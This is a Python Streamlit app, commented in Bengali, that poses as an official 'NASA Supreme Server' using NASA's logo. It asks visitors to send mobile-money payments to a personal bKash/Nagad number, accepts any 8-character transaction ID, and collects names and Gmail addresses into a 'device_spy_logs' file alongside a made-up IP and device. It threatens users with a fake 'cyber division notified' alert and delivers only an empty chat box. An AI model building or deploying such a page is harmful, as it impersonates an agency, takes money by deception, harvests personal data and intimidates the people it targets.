import streamlit as st
import random
import datetime
import os
import time

# ১. ডাটাবেস ও ট্র্যাকিং ফাইল সেটআপ
DB_FILE = "akash_secure_cloud.txt"
TRACKER_FILE = "device_spy_logs.txt"

def save_to_cloud(entry):
    with open(DB_FILE, "a", encoding="utf-8") as f:
        f.write(entry + "\n")

def log_device_info(name, ip, device, amount, trxid):
    now = datetime.datetime.now().strftime("%Y-%m-%d | %H:%M:%S")
    log_entry = f"💰 [SALE] {now} | Name: {name} | Device: {device} | Amount: {amount} | TrxID: {trxid} | IP: {ip}"
    with open(TRACKER_FILE, "a", encoding="utf-8") as f:
        f.write(log_entry + "\n")
    save_to_cloud(log_entry)

# ২. পেজ কনফিগারেশন এবং নাসার অফিসিয়াল নিয়ন ডিজাইন
st.set_page_config(page_title="NASA AI | MASTER SERVER V28", page_icon="📡", layout="wide")

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Share+Tech+Mono&display=swap');
    .stApp { background: radial-gradient(circle at center, #00122e 0%, #000000 100%) !important; color: #ffffff; font-family: 'Share Tech Mono', monospace; }
    .main-title { color: #00f2ff; text-align: center; font-family: 'Orbitron', sans-serif; font-size: 38px; text-shadow: 0 0 35px #00f2ff, 0 0 10px #ffffff; margin-top: -20px; margin-bottom: 20px; }
    .logo-container { text-align: center; margin-top: -50px; margin-bottom: 10px; }
    .payment-card { border: 2px solid #e2136e; padding: 25px; border-radius: 15px; background: rgba(226, 19, 110, 0.08); text-align: center; margin-bottom: 15px; box-shadow: 0 0 20px rgba(226, 19, 110, 0.3); }
    .hacker-alert { background: #800000; color: #fff; padding: 25px; border-radius: 12px; text-align: center; font-size: 22px; font-family: 'Orbitron', sans-serif; animation: blink 0.6s infinite; border: 2px solid #ff0000; box-shadow: 0 0 40px #ff0000; }
    @keyframes blink { 50% { opacity: 0.6; } }
</style>
""", unsafe_allow_html=True)

# ৩. সেশন ও সিকিউরিটি
if 'generated_ip' not in st.session_state: st.session_state.generated_ip = f"AKASH-{random.randint(1000, 9999)}"
if 'authenticated' not in st.session_state: st.session_state.authenticated = False
if 'payment_done' not in st.session_state: st.session_state.payment_done = False
if 'is_admin' not in st.session_state: st.session_state.is_admin = False
if 'hacker_mode' not in st.session_state: st.session_state.hacker_mode = False

# তোমার নতুন BAP VIP কোড এবং পেমেন্ট নাম্বার
BAP_VIP_CODE = "Akash@BAP#2026"    
BKASH_NO = "01967840830" 
NAGAD_NO = "01967840830" 

# ৪. হ্যাকার ট্র্যাপ
if st.session_state.hacker_mode:
    st.markdown('<div class="hacker-alert">⚠️ ILLEGAL ACCESS DETECTED!<br>DECRYPTING IP... CYBER DIVISION NOTIFIED.</div>', unsafe_allow_html=True)
    st.error("🚨 হ্যাকিং চেষ্টার কারণে আপনার তথ্য এবং আইপি ট্র্যাক করা হয়েছে।")
    if st.button("I APOLOGIZE (EXIT SYSTEM)"): 
        st.session_state.hacker_mode = False
        st.rerun()
    st.stop()

# ৫. এন্ট্রি গেটওয়ে
if not st.session_state.authenticated:
    st.markdown(f"""<div class="logo-container"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e5/NASA_logo.svg" width="130"></div>""", unsafe_allow_html=True)
    st.markdown('<h1 class="main-title">NASA SUPREME SERVER ACCESS</h1>', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        if not st.session_state.payment_done:
            # নতুন বিএপি (BAP) কোড চেক
            v_input = st.text_input("🛡️ VIP Master Key (BAP Access):", type="password", placeholder="Enter VIP BAP Key")
            
            # VIP Discount Logic
            is_vip = v_input.strip() == BAP_VIP_CODE
            
            # আইপি ডিসকাউন্ট চেক
            ip_code = st.text_input("🛡️ Discount IP Code:", placeholder="AKASH-XXXX")
            is_ip_valid = ip_code.strip().upper() == st.session_state.generated_ip
            
            # প্রাইস স্লাইডার আপডেট (তোমার শর্ত অনুযায়ী)
            if is_vip:
                min_p, max_p = (500, 2000)
                st.success("✅ VIP BAP DISCOUNT ACTIVE! (৳500 - ৳2000)")
            elif is_ip_valid:
                min_p, max_p = (1000, 3000)
            else:
                min_p, max_p = (3000, 10000)
            
            amt = st.slider("প্যাকেজ মূল্য নির্বাচন করুন (৳):", min_p, max_p, min_p, step=500)
            st.markdown(f"<h2 style='text-align:center; color:#00ff88;'>মূল্য: ৳ {amt}</h2>", unsafe_allow_html=True)
            st.markdown(f'<div class="payment-card"><b>Bkash/Nagad Personal:</b><br><h2 style="color:#ffffff;">{BKASH_NO}</h2><p>টাকা Send Money করে TrxID নিচে দিন</p></div>', unsafe_allow_html=True)
            
            with st.form("pay_gate"):
                u_name = st.text_input("আপনার নাম")
                u_trx = st.text_input("TrxID / VIP Key")
                if st.form_submit_button("সার্ভার আনলক করুন"):
                    if is_vip:
                        st.session_state.payment_done, st.session_state.authenticated, st.session_state.is_admin = True, True, True
                        st.session_state.user_name = "Akash Master (VIP)"
                        st.rerun()
                    elif len(u_trx) >= 8:
                        dummy_ip = f"103.{random.randint(10,99)}.{random.randint(100,255)}." + str(random.randint(1,255))
                        det_dev = random.choice(["iPhone 15 Pro", "Samsung S24 Ultra", "Pixel 8", "Vivo V30"])
                        st.session_state.payment_done = True
                        st.session_state.temp_name, st.session_state.temp_ip, st.session_state.temp_dev = u_name, dummy_ip, det_dev
                        st.session_state.temp_amt, st.session_state.temp_trx = amt, u_trx
                        st.success("ভেরিফাই হচ্ছে...")
                        time.sleep(2)
                        st.rerun()
        else:
            with st.form("gmail_gate"):
                u_mail = st.text_input("আপনার Gmail Address")
                if st.form_submit_button("ফাইনাল কানেক্ট"):
                    if "@gmail.com" in u_mail:
                        st.session_state.authenticated = True
                        st.session_state.user_name = st.session_state.temp_name
                        log_device_info(st.session_state.user_name, st.session_state.temp_ip, st.session_state.temp_dev, st.session_state.temp_amt, st.session_state.temp_trx)
                        st.rerun()

else:
    # ৬. এডমিন প্যানেল
    st.markdown(f"<h1 class='main-title'>SYSTEM CORE: {st.session_state.user_name}</h1>", unsafe_allow_html=True)
    if st.session_state.is_admin:
        st.info("🚀 পাওয়ার মোড: ১৮ কোটি গুণ | বিএপি এক্সেস একটিভ")
        t1, t2 = st.tabs(["🕵️‍♂️ ডিভাইস ও সেলস লগ", "🔑 কন্ট্রোল"])
        with t1:
            if os.path.exists(TRACKER_FILE):
                with open(TRACKER_FILE, "r", encoding="utf-8") as f:
                    st.markdown(f'<div style="background:#000; padding:15px; color:#00ff88; border:1px solid #00f2ff; height:400px; overflow-y:scroll;">{"<br>".join(f.readlines()[::-1])}</div>', unsafe_allow_html=True)
        with t2:
            if st.button("লগ আউট"): 
                st.session_state.authenticated = False
                st.rerun()
    else:
        st.success(f"Verified {st.session_state.user_name}: ১৮ কোটি পাওয়ার একটিভ।")
        st.chat_input("কমান্ড দিন...")
